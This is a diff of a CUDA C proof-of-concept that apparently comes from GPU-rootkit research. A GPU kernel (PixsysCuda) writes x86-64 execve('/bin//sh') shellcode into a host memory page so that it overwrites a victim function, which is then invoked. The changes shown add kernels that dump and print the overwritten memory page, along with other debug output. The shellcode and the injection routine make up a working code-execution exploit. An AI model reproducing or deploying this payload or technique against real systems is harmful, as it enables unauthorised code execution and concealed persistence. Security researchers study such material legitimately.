@@ -58,6 +58,7 @@ void aligned_free(void *ptr) {
 /* CUDA kernel to copy the shellcode. Basically copies to source with given offset. */
 __global__ void PixsysCuda(char * d_source, int offset)
 {
+	//if (threadIdx.x == 0) printf("Inside PixsysCuda\n");
 	char shellcode[] = {
 			"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
 			"\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
@@ -65,6 +66,22 @@ __global__ void PixsysCuda(char * d_source, int offset)
 	};
 		(d_source+offset)[threadIdx.x]=shellcode[threadIdx.x];
 
+}
+
+/* CUDA kernel to print out the dumped memory page. */
+__global__ void PixsysCuda_print(char * d_source, int size)
+{
+  int i;
+	printf("dumped memory page:\n");
+  for (i = 0; i < size; i ++) printf("%02x", d_source[i]);
+	printf("\n");
+}
+
+__global__ void print_kernel()
+{
+  int i;
+	printf("dumped memory page:\n");
+	printf("\n");
 }
 
 void Stub_Funct ()
@@ -116,6 +133,18 @@ typedef struct hidden_driver_info
 typedef void (*s_funct) () ;
 int main(void) {
 
+#if 1
+	print_kernel<<<1,1>>>();
+	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
+	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
+
+	CUDA_CHECK_RETURN(cudaPeekAtLastError());
+
+	fflush(stdout);
+
+
+#endif
+
 	int pagesize = 0x1000;
 	s_funct f;
 	pagesize = getpagesize(); // get Page size of system (usually 0x1000)
@@ -133,7 +162,7 @@ int main(void) {
 	char * dump_buff = (char*)aligned_malloc(pagesize*sizeof(char));
 
 	memset(real_buff,0x4141,pagesize*sizeof(char)); // Fill buffer with 414141
-	memset(dump_buff,0x4141,pagesize*sizeof(char));
+	memset(dump_buff,1,pagesize*sizeof(char));
 
 	/*calculate the victim function parameters*/
 	f=&Stub_Funct;
@@ -236,6 +265,7 @@ int main(void) {
 	/*Activate cuda kernel, that copies shellcode */
 	PixsysCuda<<<1,64>>>(d_real_buff,offset);
 
+//	fflush(stdout);
 
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 
@@ -272,8 +302,22 @@ int main(void) {
 	/* Get device pointer of this buffer */
 	CUDA_CHECK_RETURN(cudaHostGetDevicePointer((void**)&d_dump_buff, dump_buff,0));
 
-	/*Activate cuda kernel, that copies shellcode */
-//	PixsysCuda_read<<<1,64>>>(d_dump_buff);
+	fflush(stdout);
+  // test print cpu side dump_buff, shoud be 4141
+//	printf("dump_buff:\n");
+//	memset(dump_buff,1,pagesize*sizeof(char));
+//	for (int i = 0; i < 1024; i ++) printf("%d %c ", i, dump_buff[i]);
+
+	/*Activate cuda kernel, that print the dumped page */
+	PixsysCuda_print<<<1,1>>>(d_dump_buff, pagesize);
+	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
+
+	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
+
+	CUDA_CHECK_RETURN(cudaPeekAtLastError());
+
+	fflush(stdout);
+
 #endif
 
 
